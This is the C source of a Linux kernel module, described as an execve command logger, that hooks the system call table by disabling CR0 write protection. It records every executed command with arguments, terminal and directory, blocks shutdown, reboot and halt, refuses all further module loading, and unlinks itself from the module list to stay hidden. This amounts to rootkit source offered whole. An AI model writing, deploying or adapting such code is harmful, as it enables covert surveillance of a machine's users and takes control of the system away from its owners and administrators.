#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/timekeeping.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/dcache.h>
#include <linux/file.h>
#include <linux/kallsyms.h>
#include <linux/limits.h>
#include <linux/namei.h>
#include <linux/tty.h>
#include <linux/fs_struct.h>
#include <linux/path.h>
#include <linux/sched/signal.h>
#include <linux/spinlock.h>
#include <linux/time64.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Trevohack");
MODULE_DESCRIPTION("LKM: Log execve commands");

#define LOG_FILE "/var/log/cmd.log"
#define LOG_SIZE 4096
#define MAX_ARG_STRLEN 4096

unsigned long *sys_call_table;

static asmlinkage long (*orig_execve)(const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp);
static asmlinkage long (*orig_execveat)(int dfd, const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp, int flags);
static asmlinkage long (*orig_init_module)(void __user *umod, unsigned long len, const char __user *uargs);
static asmlinkage long (*orig_finit_module)(int fd, const char __user *uargs, int flags);

static int hidden = 0;
static int activate_autohide = 1;
static DEFINE_SPINLOCK(hide_lock);

static void notrace get_time_string(char *buf, size_t size) {
    struct timespec64 ts;
    struct tm tm;
    ktime_get_real_ts64(&ts);
    time64_to_tm(ts.tv_sec, 0, &tm);
    snprintf(buf, size, "[%04ld-%02d-%02d %02d:%02d:%02d.%09llu]",
             tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
             tm.tm_hour, tm.tm_min, tm.tm_sec,
             (unsigned long long)ts.tv_nsec);
}

static void notrace get_tty_string(char *buf, size_t size) {
    struct tty_struct *tty = get_current_tty();
    if (tty)
        snprintf(buf, size, "tty:%s", tty_name(tty));
    else
        snprintf(buf, size, "tty:none");
}

char *get_cwd_string(void) {
    char *buf = (char *)__get_free_page(GFP_KERNEL);
    char *cwd;
    struct path pwd;

    if (!buf)
        return NULL;

    get_fs_pwd(current->fs, &pwd);
    cwd = dentry_path_raw(pwd.dentry, buf, PAGE_SIZE);
    if (IS_ERR(cwd)) {
        free_page((unsigned long)buf);
        return NULL;
    }

    cwd = kstrdup(cwd, GFP_KERNEL);
    free_page((unsigned long)buf);
    return cwd;
}

static void notrace log_command(const char *command, const char *args, const char *cwd, const char *tty) {
    struct file *file;
    mm_segment_t old_fs;
    char *time_str, *log_entry;

    time_str = kmalloc(64, GFP_KERNEL);
    log_entry = kmalloc(LOG_SIZE, GFP_KERNEL);
    if (!time_str || !log_entry) {
        kfree(time_str);
        kfree(log_entry);
        return;
    }

    get_time_string(time_str, 64);
    snprintf(log_entry, LOG_SIZE, "[TIME: %s] | [TTY: %s | CWD: %s | BIN: %s] ~ %s\n",
             time_str, tty, cwd, command, args);

    old_fs = get_fs();
    set_fs(KERNEL_DS);
    file = filp_open(LOG_FILE, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (!IS_ERR(file)) {

        vfs_llseek(file, 0, SEEK_END);
        vfs_write(file, log_entry, strlen(log_entry), &file->f_pos); 
        filp_close(file, NULL);
    }
    set_fs(old_fs);

    kfree(time_str);
    kfree(log_entry);
}

static char *notrace get_args_string(const char __user *const __user *argv) {
    char *args = kmalloc(MAX_ARG_STRLEN, GFP_KERNEL);
    char *arg;
    int i = 0;
    const char __user *user_arg;

    if (!args)
        return NULL;
    args[0] = '\0';

    while (i < MAX_ARG_STRLEN / 16) {
        if (get_user(user_arg, &argv[i]))
            break;
        if (!user_arg)
            break;

        arg = kmalloc(MAX_ARG_STRLEN, GFP_KERNEL);
        if (!arg) {
            kfree(args);
            return NULL;
        }

        if (strncpy_from_user(arg, user_arg, MAX_ARG_STRLEN) < 0) {
            kfree(arg);
            kfree(args);
            return NULL;
        }

        strlcat(args, arg, MAX_ARG_STRLEN);
        strlcat(args, " ", MAX_ARG_STRLEN);
        kfree(arg);
        i++;
    }

    return args;
}

static int notrace check_forbidden_command(const char __user *filename, const char __user *const __user *argv) {
    char *kfilename = kmalloc(PATH_MAX, GFP_KERNEL);
    char *kargv0;
    const char *bad[] = { "shutdown", "reboot", "halt", "exit", "/sbin/shutdown", "/sbin/reboot", "/sbin/halt", "/bin/exit" };
    int i;

    if (!kfilename)
        return 0;

    if (strncpy_from_user(kfilename, filename, PATH_MAX) < 0) {
        kfree(kfilename);
        return 0;
    }

    for (i = 0; i < ARRAY_SIZE(bad); i++) {
        if (strcmp(kfilename, bad[i]) == 0) {
            kfree(kfilename);
            return 1;
        }
    }

    if (argv) {
        const char __user *user_argv0;
        if (!get_user(user_argv0, &argv[0])) {
            kargv0 = kmalloc(PATH_MAX, GFP_KERNEL);
            if (kargv0) {
                if (strncpy_from_user(kargv0, user_argv0, PATH_MAX) >= 0) {
                    for (i = 0; i < ARRAY_SIZE(bad); i++) {
                        if (strcmp(kargv0, bad[i]) == 0) {
                            kfree(kargv0);
                            kfree(kfilename);
                            return 1;
                        }
                    }
                }
                kfree(kargv0);
            }
        }
    }

    kfree(kfilename);
    return 0;
}

static void notrace hideme(void) {
    list_del(&THIS_MODULE->list);
}

asmlinkage long notrace hook_execve(const char __user *filename,
                                    const char __user *const __user *argv,
                                    const char __user *const __user *envp) {
    char *args, *cwd, *tty;
    char *kfilename;

    if (activate_autohide && !hidden) {
        spin_lock(&hide_lock);
        hideme();
        hidden = 1;
        spin_unlock(&hide_lock);
    }

    if (check_forbidden_command(filename, argv))
        return -EPERM;

    args = get_args_string(argv);
    if (!args)
        return orig_execve(filename, argv, envp);

    cwd = get_cwd_string();
    if (!cwd) {
        kfree(args);
        return orig_execve(filename, argv, envp);
    }

    tty = kmalloc(64, GFP_KERNEL);
    if (!tty) {
        kfree(args);
        kfree(cwd);
        return orig_execve(filename, argv, envp);
    }

    kfilename = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!kfilename) {
        kfree(args);
        kfree(cwd);
        kfree(tty);
        return orig_execve(filename, argv, envp);
    }

    if (strncpy_from_user(kfilename, filename, PATH_MAX) < 0) {
        kfree(kfilename);
        kfree(args);
        kfree(cwd);
        kfree(tty);
        return orig_execve(filename, argv, envp);
    }

    get_tty_string(tty, 64);
    log_command(kfilename, args, cwd, tty);

    kfree(kfilename);
    kfree(args);
    kfree(cwd);
    kfree(tty);

    return orig_execve(filename, argv, envp);
}


asmlinkage long notrace hook_execveat(int dfd, const char __user *filename,
                                      const char __user *const __user *argv,
                                      const char __user *const __user *envp,
                                      int flags) {
    return hook_execve(filename, argv, envp);
}

asmlinkage long notrace hook_init_module(void __user *umod, unsigned long len, const char __user *uargs) {
    char *kfilename = NULL;
    return -EPERM;
}

asmlinkage long notrace hook_finit_module(int fd, const char __user *uargs, int flags) {
    return -EPERM;
}

static void notrace disable_write_protection(void) {
    write_cr0(read_cr0() & (~0x00010000));
}

static void notrace enable_write_protection(void) {
    write_cr0(read_cr0() | 0x00010000);
}

static int __init roddy_init(void) {
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table)
        return -1;

    disable_write_protection();

    orig_execve = (void *)sys_call_table[__NR_execve];
    orig_execveat = (void *)sys_call_table[__NR_execveat];
    orig_init_module = (void *)sys_call_table[__NR_init_module];
    orig_finit_module = (void *)sys_call_table[__NR_finit_module];

    sys_call_table[__NR_execve] = (unsigned long)hook_execve;
    sys_call_table[__NR_execveat] = (unsigned long)hook_execveat;
    sys_call_table[__NR_init_module] = (unsigned long)hook_init_module;
    sys_call_table[__NR_finit_module] = (unsigned long)hook_finit_module;

    enable_write_protection();

    return 0;
}

static void __exit roddy_exit(void) {
    disable_write_protection();

    sys_call_table[__NR_execve] = (unsigned long)orig_execve;
    sys_call_table[__NR_execveat] = (unsigned long)orig_execveat;
    sys_call_table[__NR_init_module] = (unsigned long)orig_init_module;
    sys_call_table[__NR_finit_module] = (unsigned long)orig_finit_module;

    enable_write_protection();
}

module_init(roddy_init);
module_exit(roddy_exit);
